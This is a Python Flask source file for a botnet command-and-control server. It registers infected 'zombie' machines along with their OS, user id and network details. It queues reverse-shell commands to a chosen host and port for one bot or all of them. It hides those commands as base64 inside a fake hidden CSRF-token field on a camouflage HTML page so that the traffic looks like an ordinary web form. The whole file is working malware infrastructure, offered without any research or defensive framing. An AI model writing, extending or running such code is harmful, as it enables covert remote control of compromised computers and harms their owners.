import hashlib
import json
from base64 import b64decode, b64encode

import datetime

import os
from queue import Queue, Empty

from flask import Flask, render_template, request, jsonify
from peewee import IntegrityError, DoesNotExist

from models import Zombie, db_init

app = Flask(__name__)

hidden_command = '<input name=_csrf_token type=hidden ' \
                 'value="{}"> '
camo_html = 'camo.html'


@app.route("/")
def index():
    pass


@app.route("/api", methods=['GET', 'POST'])
def api():
    if request.method == 'POST':
        if request.form['cmd'] == 'reverse':
            cmd = {'cmd': 'reverse', 'inet': int(request.form.get('inet', 2)),
                   'type': int(request.form.get('type', 1)), 'host': request.form['host'],
                   'port': int(request.form['port'])
                   }
            if request.form.get('who', 'all') == 'all':
                for z in Zombie.select():
                    messages[z.id].put(cmd)
            else:
                messages[request.form['who']].put(cmd)
        return '', 204
    return jsonify([z.get_dict() for z in Zombie.select()])


def gen_uuid(form) -> str:
    for line in form.split('\n'):
        if 'ether' in line:
            m = hashlib.sha256(b'c2' + line.split()[1].encode())
            return b64encode(m.digest()).decode()


def random_string(length: int = 128) -> str:
    return b64encode(hashlib.sha256(os.urandom(128)).hexdigest()[:length].encode()).decode()


@app.route("/checkin")
def check_in():
    try:
        z = Zombie.get(uuid=request.args['k'].replace(' ', '+'))
    except DoesNotExist:
        pass
    else:
        print("Check-in from", z.uuid, "at", datetime.datetime.now())
        z.last_checkin = datetime.datetime.now()
        z.ip_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
        z.save()
        try:
            cmd = messages[z.id].get_nowait()
            return render_template(camo_html, command=hidden_command.format(
                b64encode(json.dumps(cmd).encode()).decode()))
        except Empty:
            pass
    return render_template(camo_html, command=hidden_command.format(random_string()))


@app.route("/register", methods=['GET', 'POST'])
def register():
    post = json.loads(b64decode(request.stream.read()).decode())
    uuid = gen_uuid(post['i'])
    remote_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
    try:
        Zombie.create(uuid=uuid, os=post['o'], ifconfig=post['i'],
                      uid=int(post['u']), uname=post['k'], ip_addr=remote_addr)
    except IntegrityError:
        print("Registration from existing zombie", uuid)
        pass
    else:
        print("Registration from new zombie", uuid)
    return render_template(camo_html, command=hidden_command.format(uuid))


if __name__ == "__main__":
    db_init()
    messages = {}
    for z in Zombie.select():
        messages[z.id] = Queue()
    app.run(debug=True)
